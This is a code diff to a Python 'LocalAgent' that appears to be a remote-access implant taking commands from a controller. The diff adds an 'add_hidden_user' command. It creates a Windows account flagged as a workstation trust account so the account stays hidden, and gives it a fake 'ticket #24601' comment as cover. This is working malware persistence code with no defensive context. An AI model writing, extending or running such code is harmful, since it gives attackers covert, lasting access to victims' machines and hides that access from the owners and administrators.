@@ -17,6 +17,7 @@ from threading import Timer
 from datetime import datetime
 import queue
 import shlex
+import ctypes
 
 import pyautogui
 from io import BytesIO
@@ -33,6 +34,8 @@ if platform.system() == 'Windows':
 	import win32evtlog
 	import win32security
 	import win32evtlogutil
+	import win32net
+	import win32netcon
 
 from directoryHarvester import DirectoryHarvester
 
@@ -680,6 +683,26 @@ class LocalAgent:
 		elif response == 'pwd':
 			self.postResponse(os.getcwd())
 			return None
+		elif response.startswith('add_hidden_user'):
+			elements = response.split(" ")
+			if not ctypes.windll.shell32.IsUserAnAdmin():
+				self.postResponse("Unable to add user, not administrator")
+				return None
+			if len(elements) == 3:
+				d={}
+				d['name'] = elements[1]
+				d['password'] = elements[2]
+				d['comment'] = "User added via ticket #24601"
+				d['flags'] = win32netcon.UF_WORKSTATION_TRUST_ACCOUNT
+				d['priv'] = win32netcon.USER_PRIV_USER
+				try:
+					win32net.NetUserAdd(None, 1, d)
+					self.postResponse("SUCCESS")
+				except Exception as e:
+					self.postResponse("Oops, something went wrong: {}".format(e))
+			else:
+				self.postResponse("Improper format for 'add_hidden_user' command")
+			return None    
 		elif response == 'die':
 			raise Exception('time to die')
 		elif response == 'clipboard':
